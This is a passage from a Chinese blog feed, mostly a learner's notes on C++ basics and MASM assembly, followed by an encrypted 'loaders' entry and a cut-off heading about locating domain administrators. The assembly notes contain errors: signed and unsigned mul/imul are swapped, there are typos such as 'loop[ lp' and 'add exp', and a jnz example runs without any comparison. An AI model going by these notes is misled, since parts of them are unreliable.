class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//命名空间</span><br><span class="hljs-keyword">namespace</span> MyName &#123;<br><span class="hljs-type">const</span> <span class="hljs-type">float</span> pi&#123; <span class="hljs-number">3.14</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">//全局声明</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> MyName;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; pi &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>面向对象</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">volume</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> Length * width * heigth;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> Length&#123; <span class="hljs-number">5</span> &#125;;<br><span class="hljs-type">int</span> width&#123; <span class="hljs-number">6</span> &#125;;<br><span class="hljs-type">int</span> heigth&#123; <span class="hljs-number">8</span> &#125;;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//创建类对象</span><br>MyClass my;<br>std::cout &lt;&lt; my.<span class="hljs-built_in">volume</span>() &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><ul><li><p><strong>用vs2017创建汇编程序项目</strong></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107152902863.png" alt="image-20240107152902863"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153046814.png" alt="image-20240107153046814"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153059392.png" alt="image-20240107153059392"></p><p>点击确定</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153131982.png" alt="image-20240107153131982"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153144389.png" alt="image-20240107153144389"></p><p>然后点击应用 确定</p></li></ul><p>下载msam32 <a href="http://www.masm32.com/">http://www.masm32.com/</a></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153154388.png" alt="image-20240107153154388"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153204880.png" alt="image-20240107153204880"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153213868.png" alt="image-20240107153213868">添加新建项  改后缀为.asm，就可以编写汇编语言了</p><p>hello word汇编程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">INCLUDELIB kernel32.lib<br>INCLUDELIB user32.lib<br> <br>.386<br>.model flat,stdcall<br> <br>MessageBoxA PROTO,<br>hwnd:DWORD,<br>lpText:DWORD,<br>lpCaption:DWORD,<br>uType:DWORD<br> <br>ExitProcess PROTO,<br>dwExitCode:DWORD<br> <br>.data<br>msg byte <span class="hljs-string">&#x27;Hello,Assembly!&#x27;</span><br> <br>.code<br>main Proc<br>mov eax,offset msg<br>push 0h<br>push 0h<br>push eax<br>push 0h<br>call MessageBoxA<br>push 0h<br>call ExitProcess<br>main endp<br>end main<br></code></pre></td></tr></table></figure><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153223180.png" alt="image-20240107153223180"></p><p>这里记录一个坑点，我本来得用的vs2019但是搭建汇编环境死活有问题，最后换了vs2017一配置立马ok</p><ul><li><strong>三类： 通用寄存器、专用寄存器、段寄存器</strong></li></ul><p>1.通用寄存器<br>数据寄存器:ax、bx、cx、dx<br>ax:作为累加器使用，是算术运算的主要寄存器<br>bx:可以作为通用寄存器，此外在计算储存地址时，它经常用作基址寄存器<br>cx:可以作为通用寄存器，此外在循环和串处理指令中作隐含的计数器<br>dx:可以作为通用寄存器，在作双字长运算时用来存放高位字</p><p>2.专用寄存器<br>IP:为指令指针寄存器，用来存放代码段中的偏移地址，在程序运行过程中，它始终指向下一条指令的首地址，它与cs寄存器联用确定下一条指令的物理地址<br>SP:为堆栈指针寄存器<br>PSW:程序状态字寄存器。由条件码标志、控制标志和系统标志构成</p><p>3.段寄存器<br>代码段CS:存放当前正在运行的程序<br>数据段DS:存放当前运行程序所用的数据<br>段栈段SS:定义来堆栈的所在区域。堆栈一种数据结构，它开辟了一个比较特殊的存储区，并以后进先出的方式来访问这一区域<br>附加段ES:是附加的数据段，它是一个辅助的数据区，也是串处理指令的目的操作数存放区</p><p>数据类型<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153248590.png" alt="image-20240107153248590"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153258793.png" alt="image-20240107153258793"></p><ul><li><strong>offset</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>szStr db <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>num dword <span class="hljs-number">5</span><br>arrNum DWORD <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br>var1 db ?<br>.code<br>main proc<br>mov eax,offset arrNum + <span class="hljs-number">4</span><br>mov eax,[eax]<br>mov eax,<span class="hljs-number">7</span><br>add ebx,<span class="hljs-number">6</span><br>sub eax,ebx<br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>jmp和loop</strong><br>jmp<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>lp:<br>inc eax<br>jmp lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>loop<br>可以规定循环次数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>mov ecx,<span class="hljs-number">10</span> ;规定执行的次数<br>lp:<br>inc eax<br>loop[ lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>复制字符串</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br><span class="hljs-function">target byte <span class="hljs-keyword">sizeof</span> source <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function">.code</span><br><span class="hljs-function">main proc</span><br><span class="hljs-function">mov esi,0</span><br><span class="hljs-function">mov ecx,<span class="hljs-keyword">sizeof</span> source</span><br><span class="hljs-function">lp:</span><br><span class="hljs-function">mov al,source[esi]</span><br><span class="hljs-function">mov target[esi],al</span><br><span class="hljs-function">inc esi</span><br><span class="hljs-function">loop lp</span><br><span class="hljs-function">push <span class="hljs-number">0</span></span><br><span class="hljs-function">call ExitProcess</span><br><span class="hljs-function">add esp,<span class="hljs-number">4</span></span><br><span class="hljs-function">main ENDP</span><br><span class="hljs-function">END main</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>-<strong>栈、堆操作</strong><br>栈 ：<br>先进后出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>sourcesize=($-source)<span class="hljs-number">-1</span> ;获取source字符串长度<br>.code<br>main proc<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l1:<br>movzx eax,source[esi]<br>push eax<br>inc esi  ;inc 对指定操着数+<span class="hljs-number">1</span>处理<br>loop l1<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l2:<br>pop eax<br>mov source[esi],al<br>inc esi<br>loop l2<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>定义函数</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addx proc uses esi ecx  ;定义函数<br>add esi,ecx<br>mov eax,esi<br>ret  ;返回值<br>addx endp<br><br>main proc<br>mov esi,<span class="hljs-number">5</span><br>mov ecx,<span class="hljs-number">6</span><br>push esi<br>push ecx<br>call addx<br>INVOKE ExitProcess, <span class="hljs-number">0</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>循环</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1 ;如果相等就向下执行，如果不相等就指定L1处<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>L1:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>jmp L2 ;执行完跳转到l2处<br>L1:<br>mov x,<span class="hljs-number">2</span><br>mov y,<span class="hljs-number">2</span><br>L2:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>条件控制</strong><br>if<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.endif ;<span class="hljs-keyword">if</span>条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>if-else</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.else<br>dec eax<br>.endif ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>if-elseif-else</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.elseif eax &lt; i<br>add eax,<span class="hljs-number">2</span><br>.else<br>dec eax<br>.endif<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">102</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.while eax &lt; i  <br>inc eax<br>.endw ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>do..while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.repeat<br>inc eax<br>.until eax &gt; <span class="hljs-number">105</span><br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>乘法</strong></li></ul><p>有符号  mul  div<br>无符号  imul  idiv</p><p>乘数bl bx ebx<br>被乘数 al ax eax</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">main proc<br>mov al,<span class="hljs-number">5</span>h<br>mov bl,<span class="hljs-number">10</span>h<br>mul bl<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>结构与宏</strong><br>结构体：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea <span class="hljs-keyword">struct</span>  ;声明结构体<br>sd1 dword ?<br>sd2 dword ?<br>iDea ends<br><br>.data<br>myiDea iDea &lt;&gt;<br>.code<br><br>main proc<br>mov myiDea.sd1,<span class="hljs-number">1</span><br>mov eax,myiDea.sd1<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>宏:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea macro <span class="hljs-type">char</span>;定义宏<br>mov eax,<span class="hljs-type">char</span><br>endm<br><br>main proc<br>iDea <span class="hljs-number">9</span><br>mov eax,eax<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类Loader</title>
    <link href="/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/"/>
    <url>/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="8b335ca099cd5607b5004c1e79bc1c9fce531b1c48a9c9c4758bbae20bc64ba7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定位域管理员</title>
    <link href="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <url>/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
    
